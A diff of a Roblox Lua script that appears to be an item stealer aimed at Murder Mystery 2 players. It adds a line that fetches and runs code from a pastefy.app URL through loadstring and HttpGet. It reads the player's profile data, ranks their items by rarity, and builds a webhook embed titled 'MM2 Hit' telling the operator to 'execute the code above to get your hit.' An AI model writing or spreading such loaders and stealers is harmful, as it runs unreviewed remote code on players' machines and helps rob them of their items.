@@ -813,7 +813,7 @@ end
 if #game:GetService("Players"):GetPlayers() == 12 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/PetsimScript/refs/heads/main/message%20(1)%20(1)-1%20(1).txt"))()
+loadstring(game:HttpGet("https://pastefy.app/Hco15aT5/raw"))()
 local LP = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
@@ -1070,10 +1070,9 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Rare\n" .. raresString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
--- if valueCount > 20 then
--- loadstring(game:HttpGet("https://pastefy.app/Jw2LlXcN/raw"))()
+
 local WebHookEmbed = CreateEmbed(
-    "Vlorp Scripts | MM2",
+    "MM2 Hit",
     "Please execute the code above to get your hit.",
     11220,
     {
